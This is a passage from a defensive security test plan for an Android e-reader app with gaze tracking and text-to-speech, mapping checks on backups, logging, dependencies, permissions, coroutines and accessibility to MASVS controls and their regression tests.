- ✓ Migration SQL: `ALTER TABLE books ADD COLUMN format TEXT NOT NULL DEFAULT 'EPUB'` — confirmed in source.
- ✅ REGRESSION TESTS (`GroupCSecurityTest`):
  - `schemaV1_identityHash_isStable` — v1 hash pinned
  - `schemaV2_identityHash_isStable` — v2 hash pinned
  - `schemaV2_booksTable_hasFormatColumn_notNull` — `format TEXT NOT NULL` present in v2
  - `schemaV1_booksTable_hasNoFormatColumn` — `format` absent from v1 (migration is additive)
  - `migration1to2_sql_addsFormatColumnWithEpubDefault` — exact migration SQL verified

---

## Section D — DataStore and local storage security

> DataStore 1.2.1 (Preferences) backs: typography, TTS speed, focus band,
> calibration weights, reading positions (CFI locators), anchor locators,
> PDF/Comics page positions.
>
> No cloud sync in V1. `android:allowBackup="false"` confirmed in Manifest.
> `data_extraction_rules.xml` excludes all sharedpref/database/file from cloud backup.

**D.1** `datastore_calibrationWeights_notInDeviceTransfer` ✅ SAFE + regression tests
- MASVS: MASVS-STORAGE-1
- Attack: D2D transfer to a new device. Calibration weights encode this device's camera geometry — on a different device they produce wrong gaze predictions with no visible indication.
- ✓ CONFIRMED: `<device-transfer>` block excludes `files/datastore/calibration_prefs.preferences_pb` and `files/datastore/tts_prefs.preferences_pb`. DataStore delegate names in source match exclusion paths exactly.
- ✅ REGRESSION TESTS (`GroupDSecurityTest`): `calibrationPrefs_excludedFromDeviceTransfer`, `ttsPrefs_excludedFromDeviceTransfer`, `calibrationRepository_datastoreName_matchesExclusionPath`, `ttsRepository_datastoreName_matchesExclusionPath`.
- ⏳ DEFERRED: ADB backup inspection on physical device.

**D.2** `datastore_readingPosition_deviceTransfer_intentional` ✓ CONFIRMED BENIGN
- MASVS: MASVS-STORAGE-1
- Analysis: `reader_prefs`, `anchor_prefs`, `comics_page_prefs`, `pdf_page_prefs` are NOT excluded from D2D transfer — the omission is harmless.
- ✓ Root cause: All DataStore keys use `bookId = UUID(content://URI)`. Content URIs are device-and-provider-specific; the same file re-imported on the new device gets a different URI → different UUID → different key → every transferred entry is permanently orphaned and never read.
- ✓ No security risk: Readium `Locator` JSON contains only EPUB-internal relative hrefs and CFI strings — no `content://` URIs, no PII.
- ✓ No correctness risk: No stale position is ever applied; Room is excluded from D2D so no `Book` row provides a key to look up.
- Future: if `bookCacheId` changes to a content-stable key (file hash, EPUB unique-id), add D2D exclusions for these four stores.
- ✅ REGRESSION TESTS (`GroupDSecurityTest`): `readingPositionRepositories_useBookIdAsKeyDiscriminator` (pins `bookId`-based key pattern; fails if key changes), `bookCacheId_derivedFromUriString_d2dTransferIsOrphanHarmless` (pins `nameUUIDFromBytes(uri.toByteArray())` implementation).

**D.3** `datastore_calibrationWeights_notInLogcat` ✅ SAFE + regression tests
- MASVS: MASVS-STORAGE-2
- Attack: Capture Logcat during calibration. Verify no `weightsX`/`weightsY` values or iris UV coordinates appear in any log line.
- ✓ CONFIRMED: All `Log.*` calls in `GazeProviderImpl.kt` and `GazeViewModel.kt` emit only status strings and exception references. `CalibrationRepository.kt` has zero log calls.
- ✅ REGRESSION TESTS (`GroupDSecurityTest`): `gazeProviderImpl_logLines_containNoWeightOrIrisData`, `gazeViewModel_logLines_containNoWeightOrIrisData`, `calibrationRepository_hasNoLogCalls`.
- ⏳ DEFERRED: Runtime logcat capture during a live calibration session (instrumented).

**D.4** `datastore_noSensitiveDataInAutoBackup` ✅ SAFE + regression tests
- MASVS: MASVS-STORAGE-1
- Attack: Enable Google Auto Backup. Verify no book content, calibration weights, or reading positions are included.
- ✓ CONFIRMED: `android:allowBackup="false"`. Belt-and-suspenders: `<cloud-backup>` block excludes all three domains with wildcard paths (`domain="file" path="."`, `domain="database" path="."`, `domain="sharedpref" path="."`).
- ✅ REGRESSION TESTS (`GroupDSecurityTest`): `manifest_allowBackupIsFalse`, `dataExtractionRules_cloudBackup_excludesAllDataTypes`.
- ⏳ DEFERRED: ADB backup inspection on physical device.

**D.5** `datastore_nocleartextStorageOfBookContent` ✅ SAFE + regression tests
- MASVS: MASVS-STORAGE-1 · MASVS-CRYPTO-1
- Attack: Verify book content is stored in app-private storage, not world-readable external storage.
- ✓ CONFIRMED: Covers → `context.filesDir`. CBZ/CBR cache → `context.cacheDir`. EPUB/PDF → content:// URI (no copy to disk). Zero uses of `getExternalStorageDirectory()`, `getExternalFilesDir()`, `getExternalCacheDir()` anywhere in main sources.
- ✅ REGRESSION TESTS (`GroupDSecurityTest`): `bookFiles_storedInAppPrivateStorage_notExternal`, `noExternalStorageApiUsage_inMainSources` (global walk of all main-source .kt files).

---

## Section E — TTS / Android speech engine privacy

> Android TTS uses the device's installed TTS engine (e.g., Google TTS).
> `TtsNavigatorFactory` from Readium Kotlin handles word-level sync.
> Samsung One UI 7+ may have no TTS engine — surfaced via `TtsUiState.EngineUnavailable`.

**E.1** `tts_stopsOnAppBackground` ⚠️ Confirmed gap — instrumented deferred
- MASVS: MASVS-PLATFORM-2
- Attack: Start TTS playback. Background the app. Verify TTS stops unless background audio is explicitly configured.
- ✓ FIXED (Sprint 16): `EpubReaderFragment.onStop()` now calls `viewModel.pauseTts()`. TTS stops when the app is backgrounded, screen turns off, or a call screen overlays the app.
- ✓ LAST-RESORT: `EpubReaderViewModel.onCleared()` calls `cleanUpTts()` — TTS stops on Activity finish (back-press, swipe from Recents).
- ✅ REGRESSION TESTS:
  - `GroupEFSecurityTest.tts_onStop_callsPauseTts` — pins `EpubReaderFragment.onStop()` → `viewModel.pauseTts()` call (added Sprint 16)
  - `GroupEFSecurityTest.tts_onCleared_callsCleanUpTts` — pins `onCleared` → `cleanUpTts()` call chain
- ⏳ DEFERRED (audio-focus): Full audio-focus release verification via `ActivityScenario` — later sprint.

**E.2** `tts_annotationContentNotSpokenWithoutIntent` ✅ SAFE (V1 has no annotation feature)
- MASVS: MASVS-PLATFORM-2
- Attack: Add a highlight/annotation to a passage. Start TTS at that passage. Verify annotation text is NOT read aloud.
- ✓ CONFIRMED SAFE (V1): No annotation Room entity registered in `AppDatabase`. `AnchorRepository` stores a navigation `Locator` only — not user-written text. `TtsNavigator` reads `Publication` content exclusively.
- ✅ REGRESSION TEST: `GroupEFSecurityTest.tts_noAnnotationFeatureInV1` — pins `AppDatabase.kt` entity list; fails if an annotation entity is added without a TTS-routing review.

**E.3** `tts_noMicrophonePermissionRequested` ✅ SAFE + regression test
- MASVS: MASVS-PLATFORM-1
- Attack: Audit `AndroidManifest.xml` and runtime permission flow. Verify `RECORD_AUDIO` is not declared and never requested.
- ✓ CONFIRMED SAFE: Manifest declares only `INTERNET` and `CAMERA`. No `RECORD_AUDIO`, no `MODIFY_AUDIO_SETTINGS`. The `<queries>` intent for `TTS_SERVICE` is a package-visibility query, not a permission.
- ✅ REGRESSION TEST: `GroupEFSecurityTest.tts_noMicrophonePermissionRequested` — asserts both absent from Manifest.

**E.4** `tts_engineUnavailable_noSilentFailure` ✅ SAFE + regression tests
- MASVS: MASVS-PLATFORM-2 (UX safety)
- Attack: Simulate `ttsFactory == null` (no TTS engine installed). Tap Play in `TtsBar`.
- ✓ CONFIRMED SAFE (two defensive paths):
  1. `startTts()` factory-null path: `_ttsUiState.value = TtsUiState.EngineUnavailable; return`
  2. `createNavigator().onFailure`: `_ttsUiState.value = TtsUiState.EngineUnavailable`
- ✓ UI: `TtsBar` branches on `EngineUnavailable` — displays `tts_engine_unavailable` string + dismiss `IconButton`.
- ✅ REGRESSION TESTS: `GroupEFSecurityTest.tts_engineUnavailable_viewModel_emitsState` (pins ≥ 2 emission paths), `tts_engineUnavailable_ttsBar_showsMessageNotSilentNoOp` (pins UI branch).

---

## Section F — Supply chain (Readium Kotlin + zip4j + junrar + EJML + MediaPipe)

> Lectern Android has 5 non-Jetpack external dependencies with meaningful attack surface:
> Readium Kotlin Toolkit 3.1.2, zip4j 2.11.6, junrar 7.5.7, EJML 0.44.0,
> MediaPipe Tasks Vision 0.10.35.
>
> All version-pinned in `gradle/libs.versions.toml`.

**F.1** `readium_versionPinned_notFloating` ✅ SAFE + regression test
- MASVS: MASVS-CODE-5
- Attack: Verify `readium = "3.1.2"` in `libs.versions.toml` is an exact pin, not `3.+` or `latest.release`.
- ✓ CONFIRMED SAFE: All 5 pins are exact: `readium = "3.1.2"`, `zip4j = "2.11.6"`, `junrar = "7.5.7"`, `ejml = "0.44.0"`, `mediapipe = "0.10.35"`. No floating `+` or `latest.` constraints anywhere in the catalog.
- ✅ REGRESSION TEST: `GroupEFSecurityTest.supply_allExternalDeps_versionPinned_notFloating` — asserts all 5 exact pins and global no-floating-version guard.

**F.2** `readium_cve_202140870_notAffected` ✅ SAFE (JVM proxy) + regression test
- MASVS: MASVS-CODE-5
- Attack: CVE-2021-40870 (Readium-2 path traversal in EPUB import) — verify Readium Kotlin 3.1.2 is not affected.
- Pass: No CVE-2021-40870 equivalent in Readium Kotlin 3.1.2. NVD check clean. Any open CVEs documented in `SECURITY.md`.
- ✓ JVM-CONFIRMED: `PublicationRepository.open()` (lines 33–48) delegates entirely to `AssetRetriever.retrieve(url)` + `PublicationOpener.open(asset)`. Zero `ZipFile`, `ZipInputStream`, `ZipContainer`, `extractAll`, `extractFile`, `extractEntry`, or `File(` calls anywhere in the file. No disk-write path exists in the integration layer.
- ✅ REGRESSION TEST: `GroupEFSecurityTest.supply_readium_cve202140870_noExtractionApiInPublicationRepository` — comment-stripped scan of `PublicationRepository.kt` asserts all seven extraction-related API tokens absent.

**F.3** `readium_noUnexpectedNetworkAccess` ✅ SAFE (JVM proxy) + regression test
- MASVS: MASVS-NETWORK-1
- Attack: Open a book, read pages, activate TTS. Capture all traffic via Android Network Profiler. Verify zero outbound requests from `org.readium.*`.
- Pass: All EPUB assets load from local storage only. No Readium analytics, CDN, or telemetry endpoints contacted.
- ✓ JVM-CONFIRMED: `PublicationRepository` wires `BlockingHttpClient` into both Readium network entry points: `AssetRetriever(appContext.contentResolver, httpClient)` (line 18) and `DefaultPublicationParser(httpClient = httpClient, ...)` (line 22). Both layers are blocked; either being unwired would allow Readium to fall back to `DefaultHttpClient`.
- ✅ REGRESSION TEST: `GroupEFSecurityTest.supply_readium_blockingHttpClient_wiredIntoBothNetworkEntryPoints` — asserts field assignment, exact `AssetRetriever` call-site form, and named-param `httpClient = httpClient` in `DefaultPublicationParser`. Three independently-removable wiring points, all verified.
- ⏳ DEFERRED (runtime): Android Network Profiler capture during live EPUB read session (instrumented).

**F.4** `zip4j_pathTraversalPrevented` ✅ SAFE (no extraction path) + regression test
- MASVS: MAVSV-STORAGE-1 · MASVS-CODE-5
- Attack: Verify `ComicsReaderViewModel` validates `ZipFile` entry names before extraction. zip4j 2.11.6 does not automatically reject `../` sequences — the caller must validate.
- ✓ CONFIRMED SAFE: `extractFile()`, `extractAll()`, and `extractEntry()` are never called anywhere in main sources. `ZipFile` is used exclusively via `getInputStream(FileHeader)` — entries are served as streams and never written to disk. No extraction path exists to validate against.
- ✅ REGRESSION TEST: `GroupEFSecurityTest.supply_zip4j_noExtractionApiCalls_inMainSources` — global walk asserts zero extraction API calls in main sources.

**F.5** `mediapipe_noFrameDataExfiltration` 🔴
- MASVS: MASVS-NETWORK-1 · MASVS-STORAGE-2
- Attack: Run gaze tracking for a full session. Capture network traffic. Verify MediaPipe Tasks Vision 0.10.35 makes no outbound requests.
- Pass: Zero network requests from `com.google.mediapipe.*` during gaze tracking. `face_landmarker.task` model file is bundled as an asset.

**F.6** `gradleDependencyVerification_checksums` ⚠️ Known V1 gap — documented, no test
- MASVS: MASVS-CODE-5
- Attack: Verify `gradle/verification-metadata.xml` is present and covers external deps, or document why it is not required.
- ⚠️ CONFIRMED ABSENT: `gradle/verification-metadata.xml` does not exist. No Gradle dependency checksum verification is in place.
- ✓ ACCEPTED RISK (V1): All 5 external deps use exact version pins (F.1). Gradle resolves from declared repositories only. CI runs on every PR. Risk is low for V1 local-only app.
- No JVM test written: `assertTrue(exists())` would permanently red CI; `assertFalse(exists())` would bless a missing control. The gap is documented here instead.
- ⏳ TODO before V2 public beta: Add `gradle/verification-metadata.xml` covering Readium, zip4j, junrar, EJML, MediaPipe checksums.

---

## Section G — AuDHD-first safety regressions (Compose)

**G.1** `audhd_noAutoPlayAnimation_onBookOpen` ✅ SAFE + regression test
- Attack: Open any book. Verify no Compose animation exceeds 200ms and no looping animation begins without user action.
- ✓ CONFIRMED: 4 × `tween(200)` in `ReaderOverlay.kt` lines 275-276, 286-287. No other `tween(`, no `durationMillis =`, no `infiniteRepeatable`, no `spring(` anywhere in main sources.
- ✅ REGRESSION TEST: `GroupGSecurityTest.audhd_animations_allTweenDurations_atMost200ms` — global walk extracting all literal-integer tween durations (positional and named-param forms), asserts all ≤ 200 ms. Variable-based durations documented as static-analysis limitation.

**G.2** `audhd_noAutoAdvancePages` ✅ SAFE + regression test
- Attack: Open a book. Wait 60 seconds without interaction. Verify no auto-advance, auto-scroll, or auto-dismiss.
- ✓ CONFIRMED: Zero `postDelayed(`, zero `CountDownTimer(` in main sources. All `LaunchedEffect` usages react to state-flow emissions (deletedBookId, needsPermission, importError) — none drive timed navigation.
- ✅ REGRESSION TEST: `GroupGSecurityTest.audhd_noAutoAdvance_noTimerDrivenNavigation` — comment-stripped + inline-tail-stripped global walk asserts absence of both timer APIs.

**G.3** `audhd_errorMessagesInlineNotAutoDismissed` ✅ FIXED (Sprint 17)
- Attack: Trigger an import error (malformed EPUB). Verify the Snackbar error message does not auto-dismiss before the user can read it.
- ✓ FIXED: `LibraryScreen.kt` `showSnackbar()` now passes `duration = SnackbarDuration.Indefinite` and `withDismissAction = true`. Error stays visible until the user taps ×.
- ✅ REGRESSION TEST: `GroupGSecurityTest.audhd_importErrorSnackbar_indefiniteDuration_withDismissAction` — asserts Indefinite duration and withDismissAction present; asserts Short absent (with comment stripping).

**G.4** `audhd_noFlashOnThemeChange` 🔴
- Attack: Switch reading theme (Light → Sepia → Dark) via the Typography Panel. Verify no flash or abrupt color change.
- Pass: Theme transition applies via Readium CSS injection — verify crossfade rather than flash.
- ⏳ DEFERRED (instrumented): requires Compose rendering.

**G.5** `audhd_gazeFocusBandDefaultOff` ✅ SAFE + regression tests (2)
- Attack: Open a book with gaze enabled and no explicit user preference set. Verify the Focus Band overlay does NOT appear by default.
- ✓ CONFIRMED (two independent layers): `FocusBandPrefs.gazeOverlayEnabled: Boolean = false` (data class default) AND `prefs[KEY_FIXATION_OVERLAY] ?: false` (DataStore first-launch fallback in `FocusBandRepository.observe()`). Both must be false for new-install guarantee; either flipping to true silently enables the overlay.
- ✅ REGRESSION TESTS: `GroupGSecurityTest.audhd_gazeOverlay_defaultOff_inPrefsClass` (data class), `audhd_gazeOverlay_defaultOff_inRepository` (DataStore fallback).

**G.6** `audhd_calibrationOverlayDismissable_noTrap` ✅ SAFE + regression test
- Attack: Open CalibrationScreen. Press device back button mid-calibration. Verify overlay dismisses.
- ✓ CONFIRMED: `MainActivity.kt` line 140: `BackHandler { gazeViewModel.cancelCalibration() }` inside `if (calibrationUiState !is CalibrationUiState.Idle)` guard at line 136. BackHandler is scoped — does not intercept reader → library back-press.
- ✅ REGRESSION TEST: `GroupGSecurityTest.audhd_calibrationOverlay_backHandlerWiresCancelCalibration` — asserts exact wiring AND uses `lastIndexOf` for the guard token to confirm the BackHandler is textually after the calibration-active condition.

**G.7** `audhd_noStreakLanguage_noBannedCopy` ✅ SAFE + regression test
- Attack: Audit all `strings.xml` entries for banned copy: streak language, loss-framing, urgency copy, contingent reward mechanics.
- ✓ CONFIRMED: `strings.xml` clean against all 12 banned terms. `check_banned_strings.sh` CI gate active.
- ✅ REGRESSION TEST: `GroupGSecurityTest.audhd_stringsXml_noBannedCopy` — walks all `src/main/res/values/*.xml`, case-insensitive scan against the same term list as the shell script. JVM-layer defence-in-depth alongside the CI gate.

---

## Section H — Android platform security

**H.1** `platform_noNetworkSecurityConfig_risk` ✅ SAFE + regression tests
- MASVS: MASVS-NETWORK-1
- Attack: No `android:networkSecurityConfig` in Manifest — Android 8 (minSdk 26) permits cleartext HTTP without an explicit config.
- ✓ CONFIRMED SAFE: `res/xml/network_security_config.xml` present with `<base-config cleartextTrafficPermitted="false">`. Referenced in `<application android:networkSecurityConfig="@xml/network_security_config">`.
- ✅ REGRESSION TESTS: `GroupHSecurityTest.platform_networkSecurityConfig_cleartext_blocked` (file content), `platform_manifest_referencesNetworkSecurityConfig` (Manifest reference).

**H.2** `platform_internetPermission_unusedInV1` ✅ SAFE (source-confirmed) + regression test
- MASVS: MASVS-NETWORK-1
- Attack: `INTERNET` permission declared for "future Supabase sync (V2)". Verify Lectern V1 makes zero network requests during normal use.
- ✓ CONFIRMED SAFE (source): No `openConnection(`, `OkHttpClient(`, `Retrofit.Builder(`, or `DefaultHttpClient` in any main-source Kotlin file (comment-stripped). `BlockingHttpClient` is the only `HttpClient` implementation — unconditionally rejects every request.
- ✅ REGRESSION TEST: `GroupHSecurityTest.platform_internetPermission_noActualNetworkCalls_inMainSources` — global walk with comment-line filtering (guards against KDoc false positives).
- ⏳ DEFERRED (runtime): Android Network Profiler zero-connections verification deferred to `androidTest/` sprint.

**H.3** `platform_cameraPermission_runtimeOnly_noHardDep` ✅ SAFE + regression tests
- MASVS: MASVS-PLATFORM-1
- Attack: Install on device without front camera. Verify app does not crash and gaze features degrade gracefully.
- ✓ CONFIRMED SAFE: `android.hardware.camera.front required="false"` — tablets without front camera not filtered from Play Store. `GazeViewModel.startGazeInternal()` catches `java.io.IOException` from `provider.start()` and sets `_gazeEnabled.value = false`.
- ✅ REGRESSION TESTS: `GroupHSecurityTest.platform_frontCamera_notRequiredAtInstall` (Manifest, order-independent line extraction), `platform_gazeViewModel_catchesIoException_disablesGaze` (source window check).

**H.4** `platform_mainActivityExported_noDeepLinkInjection` ✅ SAFE + regression tests
- MASVS: MASVS-PLATFORM-3
- Attack: Send a crafted Intent to `MainActivity` with unexpected extras or a deep-link URI.
- ✓ CONFIRMED SAFE: Manifest `<intent-filter>` contains only MAIN + LAUNCHER — no `<data android:scheme=>` or `<data android:host=>`. `MainActivity.kt` accesses no `intent.extras`, `intent.data`, or `getXxxExtra()` calls; all state is ViewModel-derived.
- ✅ REGRESSION TESTS: `GroupHSecurityTest.platform_mainActivity_noDeepLinkIntentFilter` (two-vector Manifest check), `platform_mainActivity_doesNotAccessIntentExtras` (six-term source scan).

**H.5** `platform_contentProviderNotExported` ✅ SAFE + regression test
- MASVS: MASVS-PLATFORM-2
- Attack: Verify no exported `ContentProvider` allows other apps to read book data or DataStore.
- ✓ CONFIRMED SAFE: No `<provider>` element in Manifest. Room and DataStore accessible only to app process.
- ✅ REGRESSION TEST: `GroupHSecurityTest.platform_noContentProviderExported`.

**H.6** `platform_screenshotBehavior_documented` ✅ SAFE (intentional) + regression test
- MASVS: MASVS-PLATFORM-2
- Design decision: `FLAG_SECURE` is intentionally absent. Accessibility tools (TalkBack screenshot, screen magnifiers, Compose preview tooling) require unobstructed renders. No authentication screen and no private user-generated content in V1.
- ✓ CONFIRMED: Zero `FLAG_SECURE` references in all main-source Kotlin files.
- ✅ REGRESSION TEST: `GroupHSecurityTest.platform_flagSecureAbsent_screenshotsPermitted` — global walk; test comment documents the intentional rationale and V2 revisit trigger.

---

## Section I — Kotlin coroutines / dispatcher safety

**I.1** `coroutines_gazeProviderConfinedDispatcher` ✅ SAFE + regression test
- MASVS: MASVS-CODE-3
- Attack: Verify `GazeProviderImpl` uses `Dispatchers.Default.limitedParallelism(1)` for all state mutations. Two concurrent `onLandmarkerResult` callbacks must not race on `_state`.
- Pass: MediaPipe callback → `scope.launch` on confined dispatcher. All `_state.value` assignments serialized. `calibrate()` runs `withContext(confined)` — security-critical path confirmed on confined dispatcher.
- Source: `GazeProviderImpl.kt` line 52: `private val confined = Dispatchers.Default.limitedParallelism(1)`, line 111: `withContext(confined)`.
- ✅ REGRESSION TEST: `GroupIJSecurityTest.coroutines_gazeProvider_confinedSingleThreadDispatcher` — comment-stripped source checks for both `limitedParallelism(1)` and `withContext(confined)`.

**I.2** `coroutines_roomNotOnMainThread` ✅ SAFE + regression test
- MASVS: MASVS-CODE-3
- Attack: Verify `AppDatabase.getInstance()` does not call `allowMainThreadQueries()`. All DAO calls use suspend or explicit IO dispatcher.
- Pass: No `allowMainThreadQueries()` in `AppDatabase.kt`. Confirmed.
- ✅ REGRESSION TEST: `GroupIJSecurityTest.coroutines_room_noMainThreadQueries` — assertFalse on `AppDatabase.kt` source.

**I.3** `coroutines_ttsCollectionJob_noCancellationRace` ✅ SAFE (partial) + regression test
- MASVS: MASVS-CODE-3
- Attack: Rapidly start → stop → start TTS three times. Verify no double-cancel race and no `EngineUnavailable` false positive.
- ✓ JVM-CONFIRMED: `cleanUpTts()` cancels `_ttsCollectionJob` directly at line 261, before any `launch {` in the function body. A sibling coroutine wrapping the cancel would race the ViewModel scope teardown on `onCleared()`.
- ✅ REGRESSION TEST: `GroupIJSecurityTest.coroutines_ttsCleanUp_cancelsJobDirectly_notInsideLaunch` — extracts `cleanUpTts()` body, asserts cancel precedes first launch match (regex, covers `launch{`, `launch(...) {`).
- ⏳ DEFERRED (runtime): Rapid start/stop consistency — requires `ActivityScenario` + TTS engine.

**I.4** `coroutines_gazeStopDuringCalibration_noUnhandledThrow` ✅ SAFE + regression test
- MASVS: MASVS-CODE-3
- Attack: Start calibration, disable gaze mid-calibration. `finishCalibration()` calls `requireNotNull(provider)` after `provider = null`.
- Pass: `IllegalArgumentException` caught → `CalibrationUiState.CalibrationError` emitted. No unhandled exception.
- ✓ JVM-CONFIRMED: `finishCalibration()` (GazeViewModel lines 184–201) has two separate catch clauses — `catch (e: IllegalArgumentException)` and `catch (e: IllegalStateException)` — each routing to `CalibrationUiState.CalibrationError`.
- ✅ REGRESSION TEST: `GroupIJSecurityTest.coroutines_finishCalibration_catchesBothExceptionTypes_toCalibrationError` — extracts `finishCalibration()` body; asserts both catch types; asserts `≥ 2` occurrences of `CalibrationUiState.CalibrationError` in comment-stripped body.

**I.5** `coroutines_imageAnalysisExecutor_shutdown` ✅ SAFE + regression test
- MASVS: MASVS-CODE-3
- Attack: Toggle gaze on/off rapidly five times. Verify `analysisExecutor` is shutdown on `stop()` without thread leaks.
- Pass: `analysisExecutor.shutdown()` called in `stop()`. New `GazeProviderImpl` per `startGazeInternal()` session = fresh executor per session.
- ✓ JVM-CONFIRMED: `GazeProviderImpl.stop()` (line 86) calls `analysisExecutor.shutdown()`; line 91 calls `scope.cancel()`.
- ✅ REGRESSION TEST: `GroupIJSecurityTest.coroutines_gazeProvider_stop_shutsDownAnalysisExecutor` — extracts `stop()` body, asserts both `analysisExecutor.shutdown()` and `scope.cancel()`.

---

## Section J — Gaze tracking pipeline (Android-only)

> Gaze tracking is unique to Lectern Android — no equivalent in the iOS app.
> CameraX 1.4.0 + MediaPipe Face Landmarker + ridge regression calibration.
> Raw face data must never be persisted, logged, or transmitted.

**J.1** `gaze_rawIrisUV_neverPersisted` ✅ SAFE + regression test
- MASVS: MASVS-STORAGE-1 · MASVS-STORAGE-2
- Attack: Run a calibration session. Inspect all DataStore files. Verify raw iris UV coordinates (`irisU`, `irisV`) are not persisted — only derived regression weights are stored.
- ✓ CONFIRMED: `CalibrationRepository.save()` (lines 20-25) stores only `weightsX` and `weightsY` DoubleArrays as JSON strings. `CalibrationResult` fields `irisU`/`irisV` are never referenced in the repository file. ADR-J: gaze data ephemeral in-memory only.
- ✅ REGRESSION TEST: `GroupIJSecurityTest.gaze_calibrationRepository_storesOnlyWeights_noRawIrisCoordinates` — comment-stripped whole-file scan asserts `weightsX`/`weightsY` present and `irisU`/`irisV` absent from `CalibrationRepository.kt`.
- ⏳ DEFERRED: Runtime DataStore file inspection confirming no irisU/irisV binary values (instrumented).

**J.2** `gaze_rawIrisUV_neverLogged` ✅ SAFE (JVM proxy) + regression test
- MASVS: MASVS-STORAGE-2
- Attack: Run gaze tracking in DEBUG build. Capture full Logcat. Verify no line contains `irisU`, `irisV`, or raw UV float values.
- Pass: Zero Logcat lines with iris coordinate data. `check_gaze_data_leak.sh` CI check prevents source-level regressions.
- ✓ JVM-CONFIRMED: Full gaze module scan (`gaze/` + `ui/gaze/`) — no file contains a log call (`Log.d/i/w/e/v`, `Timber.`, `println`) on the same line as `irisU` or `irisV`. Covers `CalibrationPoint.kt`, `CalibrationResult.kt`, `CalibrationScreen.kt`, `GazeState.kt` (extends GroupD D.3 which only covered `GazeProviderImpl` and `GazeViewModel`).
- ✅ REGRESSION TEST: `GroupIJSecurityTest.gaze_rawIrisUV_neverLoggedInFullGazeModule` — comment-stripped per-line scan of all .kt files in both gaze directories; any line combining a log token + iris term is a violation.
- ⏳ DEFERRED (runtime): Live Logcat capture during active calibration session (instrumented).

**J.3** `gaze_calibrationWeights_notCorruptedByDegenerate` ✅ SAFE + regression test
- MASVS: MASVS-STORAGE-1
- Attack: Confirm all 9 calibration points at identical positions (degenerate / collinear data). Verify `ridge()` fails gracefully, not silently stores wrong weights.
- Pass: `check(solver.setA(xtx))` throws `IllegalStateException` → caught → `CalibrationUiState.CalibrationError`. Previously valid weights are NOT overwritten (repository written only on success).
- ✓ JVM-CONFIRMED: `GazeProviderImpl.ridge()` line 234 contains `check(solver.setA(xtx)) { "Ridge: matrix not positive definite — degenerate calibration data" }`.
- ✅ REGRESSION TEST: `GroupIJSecurityTest.gaze_ridge_degenerateCalibrationData_checksPositiveDefinite` — extracts `ridge()` body, asserts `check(solver.setA(xtx))` present in comment-stripped source.

**J.4** `gaze_cameraPermissionRevoked_gracefulStop` ✅ SAFE + regression test + production fix
- MASVS: MASVS-PLATFORM-1
- Attack: Enable gaze, then revoke CAMERA permission from Settings while running (Android 11+). Verify no crash.
- Pass: CameraX exception caught; `_gazeEnabled` set to false; app remains functional.
- ✓ PRODUCTION FIX: `GazeViewModel.startGazeInternal()` previously only caught `IOException`. Added `SecurityException` catch (thrown by CameraX on permission revocation) with full cleanup: `_gazeEnabled.value = false`, `_gazeState.value = GazeState.Paused`, `gazeStateCollectionJob?.cancel()`, `provider = null`. `stopGazeInternal()` also gains `SecurityException` catch. `gazeStateCollectionJob` promoted to a field so `stopGazeInternal()` can cancel the state-collection coroutine even when called concurrently while `start()` is in-flight.
- ✅ REGRESSION TEST: `GroupIJSecurityTest.coroutines_gazeStart_catchesSecurityException_onPermissionRevoke` — extracts `startGazeInternal()` body; asserts `catch (e: SecurityException)` present; 500-char window asserts all four cleanup tokens inside the catch block.
- ⏳ DEFERRED (runtime): Live permission revocation via Settings + CameraX crash-free verification (instrumented).

**J.5** `gaze_thermalThrottle_stopsInference` ✅ SAFE + regression test
- MASVS: MASVS-CODE-4 (system resource safety)
- Attack: Simulate `THERMAL_STATUS_SEVERE` via `adb shell cmd power set-thermal-override SEVERE`. Verify CameraX frame delivery stops.
- Pass: `thermalListener` calls `pauseAnalysis()` → `imageAnalysis?.clearAnalyzer()`. Frame delivery and GPU inference stop. State transitions to `GazeState.Paused`.
- ✓ JVM-CONFIRMED: `thermalListener` (lines 241–255) handles all four severe statuses: `THERMAL_STATUS_SEVERE`, `THERMAL_STATUS_CRITICAL`, `THERMAL_STATUS_EMERGENCY`, `THERMAL_STATUS_SHUTDOWN`, each calling `pauseAnalysis()`. `pauseAnalysis()` (line 97) calls `imageAnalysis?.clearAnalyzer()`, not just a boolean flag.
- ✅ REGRESSION TESTS: `GroupIJSecurityTest.gaze_thermalThrottle_pausesAnalysisForAllSevereStatuses` — asserts all 4 status constants + `pauseAnalysis()` in `thermalListener` body. `GroupIJSecurityTest.gaze_pauseAnalysis_clearsAnalyzer_notJustSetsState` — extracts `pauseAnalysis()` body, asserts `imageAnalysis?.clearAnalyzer()`.
- ⏳ DEFERRED (runtime): `adb shell` thermal override + CameraX frame-count verification (instrumented).

**J.6** `gaze_modelFile_notExtractedToWorldReadable` ✅ SAFE (JVM proxy) + regression test
- MASVS: MASVS-STORAGE-1
- Attack: Verify `face_landmarker.task` is not extracted to external or world-readable storage at runtime.
- Pass: `BaseOptions.setModelAssetPath("face_landmarker.task")` loads from APK assets. No model file visible as world-readable in app sandbox.
- ✓ JVM-CONFIRMED: `GazeProviderImpl.createLandmarker()` (line 143) uses `setModelAssetPath("face_landmarker.task")` exclusively. No `filesDir`, `getExternalFilesDir`, `getCacheDir`, or `openFileOutput` reference appears anywhere in `GazeProviderImpl.kt`. MediaPipe framework-internal extraction to `filesDir` (mode 0600, app-private) is outside integration scope and not world-readable.
- ✅ REGRESSION TEST: `GroupIJSecurityTest.gaze_modelFile_loadedFromAssets_notExtractedByIntegrationCode` — asserts `setModelAssetPath("face_landmarker.task")` present; asserts all four filesystem-path APIs absent from comment-stripped source.
- ⏳ DEFERRED (runtime): `adb shell run-as` file listing to confirm no world-readable model file in app sandbox (instrumented).

---

## Full coverage matrix

| Section | Count | Status |
|---|---|---|
| A — EPUB3 content injection | 7 | ✅ A.1–A.7 JVM (A.3 hardened Sprint 17); ⏳ A.1/A.2/A.4/A.6/A.7 runtime deferred |
| B — File import from untrusted sources | 7 | ✅ B.1–B.8 JVM+androidTest (B.4, B.6, B.7 DB Sprint 18) |
| C — Room DB integrity | 5 | ✅ C.1 androidTest (Sprint 16), C.2, C.3 androidTest (Sprint 16), C.4 source+DB (Sprint 16), C.5 JVM |
| D — DataStore and local storage | 5 | ✅ All 5 JVM; D.2 confirmed benign; D.1/D.4 ADB deferred |
| E — TTS / Android speech engine | 4 | ✅ E.1 fix+JVM (Sprint 16), E.2–E.4 JVM; ⏳ E.1 audio-focus AndroidTest later sprint |
| F — Supply chain | 6 | ✅ F.1, F.2, F.3 (JVM proxy), F.4 JVM; 🔴 F.5 (runtime network), ⚠️ F.6 (documented gap) |
